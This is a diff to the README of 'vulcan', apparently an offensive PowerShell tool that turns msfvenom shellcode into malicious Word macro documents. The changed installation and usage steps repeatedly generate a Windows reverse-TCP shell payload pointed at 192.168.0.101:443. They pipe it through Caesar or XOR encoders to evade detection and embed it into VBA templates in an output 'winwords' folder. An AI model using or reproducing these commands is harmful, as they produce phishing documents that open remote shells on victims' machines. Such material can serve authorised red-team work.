@@ -26,20 +26,26 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 
 ## Installation
 
-1. Clone/download `vulcan`:
+1. Clone this repository:
 
     ```powershell
     git clone https://github.com/aress31/vulcan
     cd vulcan
     ```
 
-2. Import `vulcan`:
+2. Load the `PowerShell` scripts:
 
     ```powershell
-    . .\Invoke-Vulcan.ps1
+    Import-Module -Name .\Vulcan.psm1
     ```
 
-3. Run `vulcan`:
+3. (Optional) List available commands:
+
+    ```powershell
+    Get-Module -Name vulcan | select -ExpandProperty ExportedFunctions
+    ```
+
+4. Run `vulcan`:
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
@@ -65,26 +71,28 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
 - Embed a `plain` shellcode:
 
     ```powershell
-    .\Invoke-Vulcan.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
+    wsl --exec msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
 
 - Embed a `Caesar`-encoded shellcode:
 
     ```powershell
-    .\Invoke-Vulcan.ps1; . .\assets\encoders\Caesar.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
+    wsl --exec msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-Caesar -Key 5 | `
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder Caesar -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
     ```
 
 - Embed a `XOR`-encoded shellcode:
 
     ```powershell
-    .\Invoke-Vulcan.ps1; . .\assets\encoders\Xor.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
-        Invoke-XOR -Key "Star&WatchThisRepository" | `
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -Key "Star&WatchThisRepository" -Verbose
+    wsl --exec msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
+        Invoke-XOR -Key "StarWatchThisRepo" | `
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder XOR -DecoderPath ".\assets\decoders\xor.vba" -Key "StarWatchThisRepo" -Verbose
     ```
 
+    https://user-images.githubusercontent.com/11601622/182009703-b5bb4c27-c476-4066-b242-d77180fddf15.mp4
+        
     > [!WARNING]
     > The length of the key must be shorted than the shellcode.
 
